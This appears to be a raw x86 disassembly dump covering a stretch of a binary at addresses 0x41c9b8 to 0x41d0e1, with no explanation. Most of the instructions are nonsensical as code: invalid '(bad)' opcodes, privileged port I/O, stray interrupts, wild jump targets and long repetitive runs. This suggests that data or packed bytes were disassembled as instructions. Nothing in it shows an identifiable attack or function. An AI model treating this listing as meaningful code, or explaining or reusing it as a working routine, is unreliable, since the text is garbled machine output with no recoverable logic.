  41c9b8:	push   0x6863006f
  41c9bd:	outs   dx,DWORD PTR ds:[esi]
  41c9be:	outs   dx,BYTE PTR ds:[esi]
  41c9bf:	ins    DWORD PTR es:[edi],dx
  41c9c0:	popa   
  41c9c1:	xor    BYTE PTR [edx],dh
  41c9c3:	xor    DWORD PTR [edx],eax
  41c9c5:	mov    al,ds:0x11fc56b
  41c9ca:	mov    DWORD PTR [ecx],esi
  41c9cc:	jae    0x41c97d
  41c9ce:	bound  edx,QWORD PTR [eax-0x5aaf5fa2]
  41c9d4:	mov    al,fs:0xa387845e
  41c9da:	inc    edi
  41c9db:	jbe    0x41ca5b
  41c9dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9de:	popa   
  41c9df:	nop
  41c9e0:	xchg   esi,eax
  41c9e1:	add    DWORD PTR [ebp+0x73a07731],edx
  41c9e7:	imul   ebp,DWORD PTR [edi-0x5b],0xa591536c
  41c9ee:	inc    ebp
  41c9ef:	arpl   WORD PTR [edi-0x5b9aaf58],dx
  41c9f5:	lahf   
  41c9f6:	pop    esi
  41c9f7:	add    BYTE PTR [edx+esi*1+0x1],al
  41c9fb:	push   cs
  41c9fc:	xor    ebx,esi
  41c9fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9ff:	inc    eax
  41ca00:	inc    ebx
  41ca01:	int    0xa2
  41ca03:	jae    0x41ca59
  41ca05:	imul   DWORD PTR [esi+0x1324d66]
  41ca0b:	pusha  
  41ca0c:	xor    ebx,esi
  41ca0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca0f:	push   ebx
  41ca10:	adc    bl,ah
  41ca12:	test   al,0x4a
  41ca14:	adc    al,0xcd
  41ca16:	mov    ebp,0x3cd0c71
  41ca1b:	or     eax,0x40a4f331
  41ca20:	add    ecx,DWORD PTR ds:0xe91473a3
  41ca26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca27:	jo     0x41ca26
  41ca29:	adc    BYTE PTR [esi+0x131d460],ah
  41ca2f:	icebp  
  41ca30:	xor    edi,esi
  41ca32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca33:	(bad)  
  41ca34:	call   0xc8b57548
  41ca39:	adc    BYTE PTR [eax-0x33f7349a],ch
  41ca3f:	add    edx,esp
  41ca41:	mov    ah,0xc3
  41ca43:	repnz add bh,dh
  41ca46:	retf   0xcaa7
  41ca49:	or     ah,cl
  41ca4b:	add    DWORD PTR [esp+ebx*4-0x48704e4a],esp
  41ca52:	mov    dl,0x9d
  41ca54:	pop    edi
  41ca55:	or     DWORD PTR [edx+esi*4-0xe06646d],edi
  41ca5c:	add    BYTE PTR [ebp+ebp*4-0x6e],bl
  41ca60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca61:	push   es
  41ca62:	sub    BYTE PTR [edi],dh
  41ca64:	add    al,0x63
  41ca66:	scas   al,BYTE PTR es:[edi]
  41ca67:	(bad)  
  41ca68:	mov    BYTE PTR [esi+0x53ca7cae],0xa2
  41ca6f:	stos   DWORD PTR es:[edi],eax
  41ca70:	mov    ebx,0x4210927
  41ca75:	sub    DWORD PTR [esi-0x519c2b73],0x78
  41ca7c:	mov    esp,0xaf52aa64
  41ca81:	push   ebx
  41ca82:	into   
  41ca83:	pop    esi
  41ca84:	ret    
  41ca85:	mov    esi,0x63039e27
  41ca8a:	scas   al,BYTE PTR es:[edi]
  41ca8b:	inc    ebp
  41ca8c:	rcr    DWORD PTR [edx],0xb8
  41ca8f:	cmp    DWORD PTR [edi+0x43fadf9],ebx
  41ca95:	ins    BYTE PTR es:[edi],dx
  41ca96:	or     DWORD PTR [ecx],ebx
  41ca98:	lahf   
  41ca99:	or     eax,0x1c9f36d8
  41ca9e:	aam    0xb
  41caa0:	mov    ebx,0x3a30947
  41caa5:	jecxz  0x41ca54
  41caa7:	or     eax,0xfb9e04bf
  41caac:	enter  0xa1d3,0x2b
  41cab0:	mov    esp,0x3410927
  41cab5:	add    ebp,DWORD PTR [esi-0x668ff201]
  41cabb:	bound  ecx,QWORD PTR [eax]
  41cabd:	sub    DWORD PTR [edx-0x74ff33b8],0x3245ffe6
  41cac7:	mov    ebx,0xaa61ce62
  41cacc:	jae    0x41ca85
  41cace:	shl    DWORD PTR [edx-0x6118338e],cl
  41cad4:	ds jmp 0xa040bd0c
  41cada:	loope  0x41ca96
  41cadc:	bound  esi,QWORD PTR [ecx-0x6f924422]
  41cae2:	shl    DWORD PTR [ebp+0x57328463],1
  41cae8:	(bad)  
  41cae9:	mov    edx,0x994cad97
  41caee:	iret   
  41caef:	mov    ah,0x40
  41caf1:	jl     0x41ca93
  41caf3:	cwde   
  41caf4:	bound  ecx,QWORD PTR [edi-0x738f4472]
  41cafa:	mov    al,ds:0x3226fd26
  41caff:	mov    ebx,0xb4864e62
  41cb04:	jb     0x41cb52
  41cb06:	out    dx,eax
  41cb07:	(bad)  
  41cb08:	imul   ebx,DWORD PTR [esi+edx*4-0x19],0xffffffff
  41cb0d:	icebp  
  41cb0e:	xor    ecx,esp
  41cb10:	bound  edi,QWORD PTR ds:0x3b629976
  41cb16:	ja     0x41cadf
  41cb18:	push   0x4c
  41cb1a:	jb     0x41cb42
  41cb1c:	std    
  41cb1d:	dec    eax
  41cb1e:	rcr    DWORD PTR [esi+ebx*2+0x31d9da19],1
  41cb25:	iret   
  41cb26:	add    BYTE PTR [esi+0x32e96bb2],bl
  41cb2c:	add    BYTE PTR ds:[edx],bh
  41cb2f:	popf   
  41cb30:	stos   DWORD PTR es:[edi],eax
  41cb31:	imul   eax,DWORD PTR [eax],0x3c
  41cb34:	data16 jne 0x41cb9c
  41cb37:	sub    esi,DWORD PTR [esi+0x71]
  41cb3a:	or     DWORD PTR gs:0x7135686f,ecx
  41cb41:	imul   esi,DWORD PTR [ebx],0x6c612f2a
  41cb47:	ins    BYTE PTR es:[edi],dx
  41cb48:	or     dh,BYTE PTR [ebp+0x0]
  41cb4b:	xchg   ecx,eax
  41cb4c:	ins    BYTE PTR es:[edi],dx
  41cb4d:	jno    0x41cbb4
  41cb4f:	or     ch,BYTE PTR [edx+eiz*2+0x74]
  41cb53:	fist   DWORD PTR [edi+0x5e]
  41cb56:	arpl   WORD PTR [ebx],ax
  41cb58:	push   edi
  41cb59:	outs   dx,DWORD PTR ds:[esi]
  41cb5a:	ins    BYTE PTR es:[edi],dx
  41cb5b:	leave  
  41cb5c:	or     DWORD PTR [edi+0x0],esi
  41cb5f:	shr    DWORD PTR [ebx+0x71],1
  41cb62:	gs stos BYTE PTR es:[edi],al
  41cb64:	imul   esp,DWORD PTR [edx+0x74],0xffffffcb
  41cb68:	push   edi
  41cb69:	bound  esp,QWORD PTR [ecx-0x6c]
  41cb6c:	xchg   BYTE PTR [edx+0x72],dl
  41cb6f:	ins    BYTE PTR es:[edi],dx
  41cb70:	dec    ebx
  41cb71:	std    
  41cb72:	jmp    DWORD PTR [edi+0x73]
  41cb75:	imul   ebp,DWORD PTR [ecx-0x52],0xffffff86
  41cb79:	jno    0x41cba9
  41cb7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb7c:	ins    DWORD PTR es:[edi],dx
  41cb7d:	imul   eax,DWORD PTR [eax],0x744f0aed
  41cb83:	push   0x3e
  41cb85:	jno    0x41cbf9
  41cb87:	add    DWORD PTR [ebp+edi*8-0x1],ecx
  41cb8b:	add    al,cl
  41cb8d:	or     al,0x4f
  41cb8f:	je     0x41cb9b
  41cb91:	aas    
  41cb92:	inc    eax
  41cb93:	push   0x3e646a
  41cb98:	test   BYTE PTR [edi+ecx*2],cl
  41cb9b:	je     0x41cbf7
  41cb9d:	inc    ecx
  41cb9e:	ins    BYTE PTR es:[edi],dx
  41cb9f:	dec    ecx
  41cba0:	dec    esi
  41cba1:	popa   
  41cba2:	add    BYTE PTR ds:[esp+ecx*1+0x4f],bh
  41cba7:	je     0x41cbc3
  41cba9:	ds jno 0x41cc1e
  41cbac:	xor    ecx,esi
  41cbae:	add    ebp,edx
  41cbb0:	xor    ebx,esp
  41cbb2:	mov    bh,0x71
  41cbb4:	repnz cld 
  41cbb6:	mov    bl,0x4d
  41cbb8:	call   0x304fcfad
  41cbbd:	add    edi,DWORD PTR [eax-0x4ce41d8f]
  41cbc3:	inc    esi
  41cbc4:	fisubr WORD PTR [edi]
  41cbc6:	add    DWORD PTR [ecx-0x37],esi
  41cbc9:	push   ebx
  41cbca:	mov    edx,0xdf48c15e
  41cbcf:	arpl   WORD PTR [ebp+0x31360166],bx
  41cbd5:	cmp    DWORD PTR [edi-0x5b7c5a9e],ebx
  41cbdb:	arpl   WORD PTR [ebp+0x312a0160],cx
  41cbe1:	dec    ebx
  41cbe2:	test   al,0x73
  41cbe4:	cdq    
  41cbe5:	jnp    0x41cb9d
  41cbe7:	jae    0x41cb7c
  41cbe9:	imul   ebx,DWORD PTR [edi+0x195845e],0x7f310047
  41cbf3:	mov    ds:0xb5955a60,al
  41cbf8:	(bad)  
  41cbf9:	fimul  WORD PTR [ebx+0x1]
  41cbfc:	popa   
  41cbfd:	inc    esi
  41cbfe:	mov    WORD PTR [edi+0x9e5262],ds
  41cc04:	es xor edi,ecx
  41cc07:	lahf   
  41cc08:	ins    BYTE PTR es:[edi],dx
  41cc09:	inc    edx
  41cc0a:	int    0xb4
  41cc0c:	ins    BYTE PTR es:[edi],dx
  41cc0d:	push   edx
  41cc0e:	(bad)  
  41cc0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc10:	jae    0x41cc43
  41cc12:	out    dx,al
  41cc13:	add    esi,DWORD PTR [ecx+0xc]
  41cc16:	mov    esp,0xef9effa7
  41cc1b:	add    esi,DWORD PTR [ecx+0xc]
  41cc1e:	into   
  41cc1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc20:	pusha  
  41cc21:	add    eax,0x313e0132
  41cc26:	or     DWORD PTR [ecx],ebx
  41cc28:	test   eax,0x3e69b11
  41cc2d:	in     al,dx
  41cc2e:	or     BYTE PTR [edx],bl
  41cc30:	test   eax,0xa6fd97e2
  41cc35:	fnstenv [ebx+0x245eb7f6]
  41cc3b:	enter  0xfc03,0xb7
  41cc3f:	daa    
  41cc40:	xlat   BYTE PTR ds:[ebx]
  41cc41:	ret    0xf8a9
  41cc44:	mov    bh,0xc3
  41cc46:	cwde   
  41cc47:	out    0x3,al
  41cc49:	les    edx,FWORD PTR [edi-0x28365933]
  41cc4f:	sbb    dl,ah
  41cc51:	xchg   edx,eax
  41cc52:	mov    ch,0xba
  41cc54:	add    eax,DWORD PTR [eax]
  41cc56:	jp     0x41cc61
  41cc58:	mov    bl,0xa2
  41cc5a:	jg     0x41cc09
  41cc5c:	xchg   ebx,eax
  41cc5d:	mov    dh,0x93
  41cc5f:	xchg   edi,eax
  41cc60:	xchg   esi,eax
  41cc61:	mov    ch,0x9d
  41cc63:	stos   DWORD PTR es:[edi],eax
  41cc64:	mov    edi,0xe6ca939f
  41cc69:	add    ebx,DWORD PTR [esi+0x9]
  41cc6c:	mov    ah,0xa1
  41cc6e:	mov    dh,BYTE PTR [edi+eax*4-0x7c677c59]
  41cc75:	mov    ch,0x76
  41cc77:	xchg   edi,eax
  41cc78:	xchg   ebp,eax
  41cc79:	test   eax,0x383b557
  41cc7e:	bound  ebx,QWORD PTR [eax-0x4cac4a75]
  41cc84:	je     0x41cc67
  41cc86:	push   edx
  41cc87:	mov    ch,0x52
  41cc89:	add    al,0x31
  41cc8b:	or     edi,esp
  41cc8d:	add    esi,DWORD PTR [ecx]
  41cc8f:	or     edi,esp
  41cc91:	add    esi,DWORD PTR [ecx]
  41cc93:	or     edi,esp
  41cc95:	add    esi,DWORD PTR [ecx]
  41cc97:	or     edi,esp
  41cc99:	add    esi,DWORD PTR [ecx]
  41cc9b:	or     edi,esp
  41cc9d:	add    esi,DWORD PTR [ecx]
  41cc9f:	or     DWORD PTR [eax],eax
  41cca1:	jmp    0xe941d5d8
  41cca6:	xor    cl,BYTE PTR [ecx]
  41cca8:	add    cl,ch
  41ccaa:	xor    cl,BYTE PTR [ecx]
  41ccac:	add    cl,ch
  41ccae:	xor    cl,BYTE PTR [ecx]
  41ccb0:	add    cl,ch
  41ccb2:	xor    cl,BYTE PTR [ecx]
  41ccb4:	add    cl,ch
  41ccb6:	xor    cl,BYTE PTR [ecx]
  41ccb8:	add    cl,ch
  41ccba:	add    BYTE PTR [edx],dh
  41ccbc:	or     DWORD PTR [eax],eax
  41ccbe:	jmp    0xe941d5f5
  41ccc3:	xor    cl,BYTE PTR [ecx]
  41ccc5:	add    cl,ch
  41ccc7:	xor    cl,BYTE PTR [ecx]
  41ccc9:	add    cl,ch
  41cccb:	xor    cl,BYTE PTR [ecx]
  41cccd:	add    cl,ch
  41cccf:	xor    cl,BYTE PTR [ecx]
  41ccd1:	add    cl,ch
  41ccd3:	xor    cl,BYTE PTR [ecx]
  41ccd5:	add    cl,ch
  41ccd7:	xor    cl,BYTE PTR [ecx]
  41ccd9:	add    cl,ch
  41ccdb:	xor    cl,BYTE PTR [ecx]
  41ccdd:	add    cl,ch
  41ccdf:	xor    cl,BYTE PTR [ecx]
  41cce1:	add    cl,ch
  41cce3:	xor    cl,BYTE PTR [ecx]
  41cce5:	add    cl,ch
  41cce7:	xor    cl,BYTE PTR [ecx]
  41cce9:	add    cl,ch
  41cceb:	xor    cl,BYTE PTR [ecx]
  41cced:	add    cl,ch
  41ccef:	xor    cl,BYTE PTR [ecx]
  41ccf1:	add    cl,ch
  41ccf3:	xor    cl,BYTE PTR [ecx]
  41ccf5:	add    cl,ch
  41ccf7:	xor    cl,BYTE PTR [ecx]
  41ccf9:	add    cl,ch
  41ccfb:	xor    cl,BYTE PTR [ecx]
  41ccfd:	add    cl,ch
  41ccff:	xor    cl,BYTE PTR [ecx]
  41cd01:	add    cl,ch
  41cd03:	xor    cl,BYTE PTR [ecx]
  41cd05:	add    cl,ch
  41cd07:	xor    cl,BYTE PTR [ecx]
  41cd09:	add    cl,ch
  41cd0b:	xor    cl,BYTE PTR [ecx]
  41cd0d:	add    cl,ch
  41cd0f:	xor    cl,BYTE PTR [ecx]
  41cd11:	add    cl,ch
  41cd13:	xor    cl,BYTE PTR [ecx]
  41cd15:	add    cl,ch
  41cd17:	xor    cl,BYTE PTR [ecx]
  41cd19:	add    BYTE PTR [eax],al
  41cd1b:	mov    BYTE PTR [esi],al
  41cd1d:	add    BYTE PTR [eax],al
  41cd1f:	add    BYTE PTR [eax-0x67fffffa],cl
  41cd25:	push   es
  41cd26:	add    BYTE PTR [eax],al
  41cd28:	cwde   
  41cd29:	push   es
  41cd2a:	add    BYTE PTR [eax],al
  41cd2c:	mov    BYTE PTR [esi],al
  41cd2e:	add    BYTE PTR [eax],al
  41cd30:	mov    BYTE PTR [esi],al
  41cd32:	add    BYTE PTR [eax],al
  41cd34:	pop    eax
  41cd35:	push   es
  41cd36:	add    BYTE PTR [eax],al
  41cd38:	pop    eax
  41cd39:	push   es
  41cd3a:	add    BYTE PTR [eax],al
  41cd3c:	dec    eax
  41cd3d:	push   es
  41cd3e:	add    BYTE PTR [eax],al
  41cd40:	dec    eax
  41cd41:	push   es
  41cd42:	add    BYTE PTR [eax],al
  41cd44:	pop    eax
  41cd45:	push   es
  41cd46:	add    BYTE PTR [eax],al
  41cd48:	pop    eax
  41cd49:	push   es
  41cd4a:	add    BYTE PTR [eax],al
  41cd4c:	dec    eax
  41cd4d:	push   es
  41cd4e:	add    BYTE PTR [eax],al
  41cd50:	dec    eax
  41cd51:	push   es
  41cd52:	add    BYTE PTR [eax],al
  41cd54:	sbb    BYTE PTR [esi],al
  41cd56:	add    BYTE PTR [eax],al
  41cd58:	sbb    BYTE PTR [esi],al
  41cd5a:	add    BYTE PTR [eax],al
  41cd5c:	or     BYTE PTR [esi],al
  41cd5e:	add    BYTE PTR [eax],al
  41cd60:	or     BYTE PTR [esi],al
  41cd62:	add    BYTE PTR [eax],al
  41cd64:	sbb    BYTE PTR [esi],al
  41cd66:	add    BYTE PTR [eax],al
  41cd68:	sbb    BYTE PTR [esi],al
  41cd6a:	add    BYTE PTR [eax],al
  41cd6c:	or     BYTE PTR [esi],al
  41cd6e:	add    BYTE PTR [eax],al
  41cd70:	or     BYTE PTR [esi],al
  41cd72:	add    BYTE PTR [eax],al
  41cd74:	test   BYTE PTR [esi-0x3445ae14],cl
  41cd7a:	pop    es
  41cd7b:	mov    ch,BYTE PTR [ecx]
  41cd7d:	xchg   ecx,eax
  41cd7e:	dec    ebx
  41cd7f:	jmp    FWORD PTR [edx+0xc35b2b]
  41cd85:	fs mov gs,esp
  41cd88:	push   ecx
  41cd89:	pop    edi
  41cd8a:	mov    edx,0x8e55c930
  41cd8f:	outs   dx,DWORD PTR ds:[esi]
  41cd90:	xor    BYTE PTR [edx+0x278b0b9a],ch
  41cd96:	add    eax,0x90394689
  41cd9b:	inc    ebx
  41cd9c:	cld    
  41cd9d:	stos   BYTE PTR es:[edi],al
  41cd9e:	mov    ds:0x895f8b1f,al
  41cda3:	cmp    eax,0x800a056b
  41cda8:	aas    
  41cda9:	cli    
  41cdaa:	pushf  
  41cdab:	add    ebx,ebp
  41cdad:	mov    cl,al
  41cdaf:	pop    ebp
  41cdb0:	mov    ecx,DWORD PTR [ebx+eax*8-0x71fb3340]
  41cdb7:	in     al,dx
  41cdb8:	adc    DWORD PTR [ebp-0x14],0xffffff88
  41cdbc:	inc    ebp
  41cdbd:	sub    DWORD PTR [eax-0x2c551fbd],edx
  41cdc3:	fisttp WORD PTR [ebx+0x510128e4]
  41cdc9:	add    eax,0xaae45390
  41cdce:	retf   
  41cdcf:	jecxz  0x41cd5c
  41cdd1:	jmp    0x398ece76
  41cdd6:	xchg   edx,eax
  41cdd7:	dec    ebx
  41cdd8:	clc    
  41cdd9:	mov    edx,0x738bf7b6
  41cdde:	in     eax,0x0
  41cde0:	inc    ebp
  41cde1:	sub    DWORD PTR [edx-0x314517bd],edx
  41cde7:	test   DWORD PTR [ebx+0xe96000],0x53922955
  41cdf1:	lock stos BYTE PTR es:[edi],al
  41cdf3:	(bad)  
  41cdf4:	test   DWORD PTR [ebx+0x4d00fd79],0xfc4b9239
  41cdfe:	test   dh,0xf3
  41ce01:	add    BYTE PTR [ecx],dh
  41ce03:	or     DWORD PTR [eax],eax
  41ce05:	jmp    0x41ce3f
  41ce07:	xchg   esp,eax
  41ce08:	push   ebx
  41ce09:	hlt    
  41ce0a:	mov    dl,0x4b
  41ce0c:	dec    DWORD PTR [eax+0x45891564]
  41ce12:	mov    ecx,0x6af44b94
  41ce17:	rcl    DWORD PTR [edi],1
  41ce19:	jae    0x41ce14
  41ce1b:	xchg   ebx,eax
  41ce1c:	push   ebx
  41ce1d:	lock stos BYTE PTR es:[edi],al
  41ce1f:	or     eax,DWORD PTR [ecx]
  41ce21:	inc    ebp
  41ce22:	sub    DWORD PTR [edx+0xf1bdc43],edx
  41ce28:	push   0xffc933ac
  41ce2d:	mov    ch,ah
  41ce2f:	cmp    al,0x4f
  41ce31:	call   0x41d817
  41ce36:	mov    dl,0x45
  41ce38:	or     al,0x85
  41ce3a:	jno    0x41cdd2
  41ce3c:	sbb    BYTE PTR [ebx+0x45891504],cl
  41ce42:	dec    ecx
  41ce43:	adc    BYTE PTR [ebp+0x4b91e10c],dh
  41ce49:	in     al,dx
  41ce4a:	mov    edx,0x8bebb6
  41ce4f:	hlt    
  41ce50:	sbb    al,0x89
  41ce52:	add    al,0xa1
  41ce54:	or     al,0x43
  41ce56:	or     BYTE PTR [edx],bl
  41ce58:	push   cs
  41ce59:	mov    DWORD PTR [ebp+0x21],ecx
  41ce5c:	mov    WORD PTR [edi-0x103257fc],?
  41ce62:	jmp    0x41ce31
  41ce64:	fstp   TBYTE PTR [edi-0x3f41eb75]
  41ce6a:	int3   
  41ce6b:	cmc    
  41ce6c:	dec    esp
  41ce6d:	int3   
  41ce6e:	int3   
  41ce6f:	in     eax,dx
  41ce70:	dec    esp
  41ce71:	int3   
  41ce72:	int3   
  41ce73:	in     eax,0x4c
  41ce75:	int3   
  41ce76:	int3   
  41ce77:	test   BYTE PTR [esp+ebp*8-0x17ff2a7d],dl
  41ce7e:	add    eax,0x89fd1fde
  41ce83:	ins    BYTE PTR es:[edi],dx
  41ce84:	xor    DWORD PTR [ecx-0x184726bb],ecx
  41ce8a:	sub    esi,eax
  41ce8c:	pop    ds
  41ce8d:	std    
  41ce8e:	xor    ebp,0x4
  41ce91:	mov    eax,ds:0xffca3ef4
  41ce96:	addr16 in eax,dx
  41ce98:	or     al,BYTE PTR [eax+0x0]
  41ce9b:	mov    edx,0x9e51e7cd
  41cea0:	cmc    
  41cea1:	repz ja 0x41ce94
  41cea4:	or     BYTE PTR [ecx-0x35f908],ah
  41ceaa:	imul   esi,DWORD PTR [ecx],0x6d67ffb3
  41ceb0:	or     al,BYTE PTR [eax+0x0]
  41ceb3:	add    BYTE PTR [esi-0xb],dh
  41ceb6:	div    DWORD PTR [edi-0x10]
  41ceb9:	or     BYTE PTR [edi+0x43475945],al
  41cebf:	cld    
  41cec0:	xor    DWORD PTR [ecx],ecx
  41cec2:	add    BYTE PTR [eax],al
  41cec4:	dec    edx
  41cec5:	adc    DWORD PTR [ecx-0x3d74b2ab],ecx
  41cecb:	add    DWORD PTR [eax-0x437c044b],edi
  41ced1:	sbb    al,0x8
  41ced3:	jae    0x41cee5
  41ced5:	xchg   esp,eax
  41ced6:	inc    ebx
  41ced7:	cld    
  41ced8:	mov    edx,0x338c830d
  41cedd:	leave  
  41cede:	call   DWORD PTR [eax-0x56]
  41cee1:	mov    ah,0xe7
  41cee3:	push   edx
  41cee4:	push   ss
  41cee5:	cmc    
  41cee6:	repz ja 0x41cf59
  41cee9:	or     DWORD PTR [ecx+0x491054d],ecx
  41ceef:	lea    eax,ds:0xa003e97
  41cef5:	cmp    cl,BYTE PTR [ecx-0x33b5731b]
  41cefb:	int3   
  41cefc:	cmc    
  41cefd:	dec    ebp
  41cefe:	int3   
  41ceff:	int3   
  41cf00:	in     eax,dx
  41cf01:	dec    ebp
  41cf02:	int3   
  41cf03:	int3   
  41cf04:	in     eax,0x4d
  41cf06:	int3   
  41cf07:	int3   
  41cf08:	fs xchg edx,eax
  41cf0a:	in     al,dx
  41cf0b:	mov    eax,ds:0x3ea161
  41cf10:	call   DWORD PTR [ecx-0x3355cfc0]
  41cf16:	pop    es
  41cf17:	add    BYTE PTR ds:[eax+0x725d07d1],bh
  41cf1e:	dec    ebp
  41cf1f:	int3   
  41cf20:	int3   
  41cf21:	ins    DWORD PTR es:[edi],dx
  41cf22:	dec    ebp
  41cf23:	int3   
  41cf24:	int3   
  41cf25:	gs dec ebp
  41cf27:	int3   
  41cf28:	int3   
  41cf29:	in     al,0x91
  41cf2b:	in     al,dx
  41cf2c:	mov    ebp,esp
  41cf2e:	or     al,0x50
  41cf30:	mov    ebp,esp
  41cf32:	adc    BYTE PTR [edi-0x1],cl
  41cf35:	sbb    al,0x15
  41cf37:	jne    0x41cf7a
  41cf39:	xor    DWORD PTR [eax+eax*8-0x33b28a34],edi
  41cf40:	int3   
  41cf41:	ins    DWORD PTR es:[edi],dx
  41cf42:	dec    ebp
  41cf43:	int3   
  41cf44:	int3   
  41cf45:	gs dec ebp
  41cf47:	int3   
  41cf48:	int3   
  41cf49:	in     al,0x91
  41cf4b:	in     al,dx
  41cf4c:	adc    DWORD PTR [ebp+0x11],0x6a
  41cf50:	add    bl,cl
  41cf52:	or     BYTE PTR [eax-0x24],ch
  41cf55:	xor    ecx,ecx
  41cf57:	(bad)  
  41cf58:	inc    BYTE PTR [ecx+eiz*1+0x75]
  41cf5c:	inc    ecx
  41cf5d:	xor    DWORD PTR [eax+0x3189f843],edx
  41cf63:	add    al,BYTE PTR [eax+0x31]
  41cf66:	xchg   edx,eax
  41cf67:	inc    ebx
  41cf68:	clc    
  41cf69:	popa   
  41cf6a:	xor    DWORD PTR [edx-0x7ee1f901],edi
  41cf70:	les    ebp,FWORD PTR [ecx]
  41cf72:	nop
  41cf73:	inc    ebx
  41cf74:	cld    
  41cf75:	stos   BYTE PTR es:[edi],al
  41cf76:	retf   
  41cf77:	sqrtps xmm7,XMMWORD PTR [edx+0x520bb3]
  41cf7e:	mov    edx,0xde5007c3
  41cf83:	mov    bl,0xfb
  41cf85:	mov    ecx,esp
  41cf87:	mov    ebx,0x9264ccc0
  41cf8c:	in     al,dx
  41cf8d:	push   ecx
  41cf8e:	out    dx,al
  41cf8f:	ret    
  41cf90:	sti    
  41cf91:	add    BYTE PTR [ecx],dh
  41cf93:	or     DWORD PTR [eax],eax
  41cf95:	jmp    0x41cfbf
  41cf97:	xchg   edx,eax
  41cf98:	inc    ebx
  41cf99:	cld    
  41cf9a:	mov    dl,0x48
  41cf9c:	dec    DWORD PTR [eax+0x4d891cec]
  41cfa2:	popf   
  41cfa3:	loope  0x41cfef
  41cfa5:	adc    BYTE PTR [edx],ah
  41cfa7:	dec    BYTE PTR [eax+0x530a3955]
  41cfad:	cld    
  41cfae:	ss push edi
  41cfb0:	add    cl,BYTE PTR [ebx+0x4d010cec]
  41cfb6:	jne    0x41cfc5
  41cfb8:	mov    dh,0x11
  41cfba:	sub    cl,BYTE PTR [ebx+0x74]
  41cfbd:	pop    es
  41cfbe:	test   eax,0x31000007
  41cfc3:	xor    al,BYTE PTR [ebx+ebp*8]
  41cfc6:	sbb    ecx,0xbb548bbf
  41cfcc:	ror    ah,0x75
  41cfcf:	dec    esp
  41cfd0:	int3   
  41cfd1:	int3   
  41cfd2:	ins    DWORD PTR es:[edi],dx
  41cfd3:	dec    esp
  41cfd4:	int3   
  41cfd5:	int3   
  41cfd6:	gs dec esp
  41cfd8:	int3   
  41cfd9:	int3   
  41cfda:	test   BYTE PTR [eax+0x949b9ec],dl
  41cfe0:	add    BYTE PTR [eax],al
  41cfe2:	add    BYTE PTR [ebp+0x24890790],dl
  41cfe8:	mov    ecx,0xbe314177
  41cfed:	ror    ah,0xf5
  41cff0:	dec    ebp
  41cff1:	int3   
  41cff2:	int3   
  41cff3:	in     eax,dx
  41cff4:	dec    ebp
  41cff5:	int3   
  41cff6:	int3   
  41cff7:	in     eax,0x4d
  41cff9:	int3   
  41cffa:	int3   
  41cffb:	test   BYTE PTR [eax-0x62a7c14],dl
  41d001:	mov    BYTE PTR [ebp+0x29],al
  41d004:	mov    BYTE PTR [eax+0x4],bh
  41d007:	xor    DWORD PTR [esp+eax*4],ecx
  41d00a:	mov    BYTE PTR [ecx],dh
  41d00c:	or     DWORD PTR [eax],eax
  41d00e:	mov    esi,DWORD PTR [ecx+edx*1-0x77]
  41d012:	push   ecx
  41d013:	xor    eax,0xe008ea88
  41d018:	das    
  41d019:	xchg   DWORD PTR [ebp-0x5b],edx
  41d01c:	nop
  41d01d:	inc    ebx
  41d01e:	or     BYTE PTR [edx-0xb76f7b7],dh
  41d024:	sbb    ch,al
  41d026:	inc    ebp
  41d027:	xchg   ebp,eax
  41d028:	or     DWORD PTR [eax],eax
  41d02a:	add    BYTE PTR [ecx],dh
  41d02c:	xor    BYTE PTR [edi],al
  41d02e:	mov    esi,esp
  41d030:	sbb    al,0x81
  41d032:	shl    DWORD PTR [eax],0x92
  41d035:	dec    ebx
  41d036:	cld    
  41d037:	stos   BYTE PTR es:[edi],al
  41d038:	mov    dh,0xfb
  41d03a:	cmp    eax,DWORD PTR [edx*1-0x3945b98f]
  41d041:	sti    
  41d042:	mov    ebp,esp
  41d044:	sbb    BYTE PTR ds:0xca3d00b7,cl
  41d04a:	mov    esi,0xfa883dfa
  41d04f:	add    edi,DWORD PTR [esi+edx*8-0x6fc2ba78]
  41d056:	dec    ebx
  41d057:	lock es push esp
  41d05a:	adc    al,0x41
  41d05c:	mov    al,0x26
  41d05e:	std    
  41d05f:	rdtsc  
  41d061:	or     DWORD PTR [edi+0x43901955],eax
  41d067:	or     BYTE PTR [edx+0x39030bcd],ch
  41d06d:	nop
  41d06e:	push   ebx
  41d06f:	clc    
  41d070:	mov    edx,0x74030f04
  41d075:	stc    
  41d076:	mov    BYTE PTR [ebp+0x29],cl
  41d079:	nop
  41d07a:	push   ebx
  41d07b:	or     al,0x32
  41d07d:	cli    
  41d07e:	mov    BYTE PTR [ebp-0x17],cl
  41d081:	xchg   ecx,eax
  41d082:	add    al,0xa
  41d084:	retf   0x8971
  41d087:	push   ebp
  41d088:	sub    DWORD PTR [eax-0x38cdf7bd],edx
  41d08e:	add    ecx,DWORD PTR [ecx+0x6be7116c]
  41d094:	mov    esi,0xcc8bfd1b
  41d099:	mov    ebp,0x9004ccc0
  41d09e:	in     al,dx
  41d09f:	adc    DWORD PTR [ebp+0x294588e4],0xffffff92
  41d0a6:	inc    ebx
  41d0a7:	in     al,0xaa
  41d0a9:	int    0xe3
  41d0ab:	mov    eax,DWORD PTR [eax]
  41d0ad:	in     al,0x24
  41d0af:	add    DWORD PTR [ecx+0x45],edx
  41d0b2:	xchg   edx,eax
  41d0b3:	push   ebx
  41d0b4:	call   0x8c299663
  41d0b9:	test   eax,0x31000088
  41d0be:	xchg   edx,eax
  41d0bf:	dec    ebx
  41d0c0:	lock mov dl,0x9d
  41d0c3:	out    dx,eax
  41d0c4:	add    BYTE PTR [esi],ch
  41d0c6:	test   ecx,edi
  41d0c8:	add    BYTE PTR [ecx],dh
  41d0ca:	or     DWORD PTR [ecx+0x53083955],ecx
  41d0d0:	lock mov eax,0xf48bdfb5
  41d0d6:	sub    BYTE PTR [ecx+0xd092178],al
  41d0dc:	test   BYTE PTR [edx+ecx*1],dl
  41d0df:	add    BYTE PTR [eax],al
  41d0e1:	fwait
